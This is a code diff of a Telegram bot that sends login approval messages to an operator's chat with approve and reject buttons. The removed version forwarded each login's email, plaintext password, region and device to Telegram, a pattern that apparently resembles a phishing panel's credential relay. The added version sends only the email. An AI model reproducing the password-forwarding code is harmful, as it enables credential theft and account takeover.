@@ -1,6 +1,6 @@
 // bot.js
 import TelegramBot from "node-telegram-bot-api";
-import { pendingApprovals } from "./server.js"; // import the pending approvals object
+import { pendingApprovals } from "./server.js"; // import pending approvals object
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
@@ -13,9 +13,9 @@ if (!BOT_TOKEN || !CHAT_ID) {
 // Initialize bot
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
-// Function to send login approval message
-export async function sendLoginTelegram(email, password, region, device) {
-  const message = `📥 New Login Request\n\n<b>Email:</b> ${email}\n<b>Password:</b> ${password}\n<b>Region:</b> ${region}\n<b>Device:</b> ${device}`;
+// Function to send backend login approval message
+export async function sendLoginApproval(email) {
+  const message = `<b>CB login approval</b>\n\n<b>Email:</b> ${email}`;
   const options = {
     parse_mode: "HTML",
     reply_markup: {
@@ -30,8 +30,9 @@ export async function sendLoginTelegram(email, password, region, device) {
 
   try {
     await bot.sendMessage(CHAT_ID, message, options);
+    console.log(`Backend approval message sent for ${email}`);
   } catch (err) {
-    console.error("Failed to send Telegram message:", err);
+    console.error("Failed to send backend Telegram message:", err);
   }
 }
 
@@ -44,8 +45,12 @@ bot.on("callback_query", async (query) => {
   if (action === "reject") pendingApprovals[email].status = "rejected";
 
   await bot.answerCallbackQuery(query.id, { text: `User ${action}ed.` });
+  
+  // Remove buttons after action
   await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
     chat_id: query.message.chat.id,
     message_id: query.message.message_id
   });
+
+  console.log(`Approval ${action} processed for ${email}`);
 });
